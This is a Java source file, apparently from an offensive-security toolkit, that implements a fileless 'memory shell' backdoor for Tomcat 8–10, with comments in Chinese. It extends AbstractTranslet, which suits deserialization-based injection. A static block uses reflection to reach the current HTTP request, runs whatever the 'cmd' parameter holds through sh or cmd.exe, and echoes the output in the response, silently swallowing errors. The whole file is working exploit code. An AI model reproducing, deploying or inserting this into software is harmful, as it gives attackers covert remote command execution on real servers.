package org.example.tomcatmemshell.servlet;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.loader.WebappClassLoaderBase;

import java.lang.reflect.Field;

//1. getContextClassLoader()->resources->getContext()先获取StandardContext。然后StandardContext->context(ApplicationContext)->service(StandardService)可以获取到StandardService。
//2. 从StandardService->connectors->Connector的路径取出connector。connector内部有protocolHandler字段，存储着Http11NioProtocol
//3. 获取到了Http11NioProtocol，才能调用其父类AbstractHttp11Protocol的getHandler或者反射 去获取AbstractHttp11Protocol构造函数所创建的`AbstarctProtocol$ConnectionHandler`。以上都是因为ConnectionHandler是个内部类带来的麻烦事
//4. 获取到了ConnectionHandler，就可以反射获取global静态字段，global实际上是RequestGroupInfo，可以按照RequestGroupInfo->RequestInfo->Request的方式获取到Request
//通用tomcat 8 9 10
public class GenericTomcatMemShell2 extends AbstractTranslet {

    static {
        try {
            //传递的参数，后门标识
            String pass = "cmd";

            //获取WebappClassLoaderBase
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();

            //获取ApplicationContext
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(StandardContext);

            //获取StandardService
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            serviceField.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);

            //获取Connector
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();

            //找到指定的Connector
            for (int i = 0; i < connectors.length; i++) {
                if (connectors[i].getScheme().contains("http")) {
                    //获取protocolHandler、connectionHandler
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                    getHandlerMethod.setAccessible(true);
                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);

                    //获取RequestGroupInfo
                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler);

                    //获取RequestGroupInfo中储存了RequestInfo的processors
                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                    for (int k = 0; k < list.size(); k++) {
                        org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
                        if (requestInfo.getCurrentQueryString().contains(pass)) {
                            //获取request
                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                            requestField.setAccessible(true);
                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                            //执行命令
                            String cmd = request.getParameter(pass);
                            if (cmd != null) {
                                String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                                String output = s.hasNext() ? s.next() : "";
                                //回显
                                java.io.Writer writer = request.getResponse().getWriter();
                                java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                                usingWriter.setAccessible(true);
                                usingWriter.set(request.getResponse(), Boolean.FALSE);
                                writer.write(output);
                                writer.flush();
                            }
                            break;
                        }
                        break;
                    }
                    break;
                }
            }
        }
        catch (Exception e) {
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
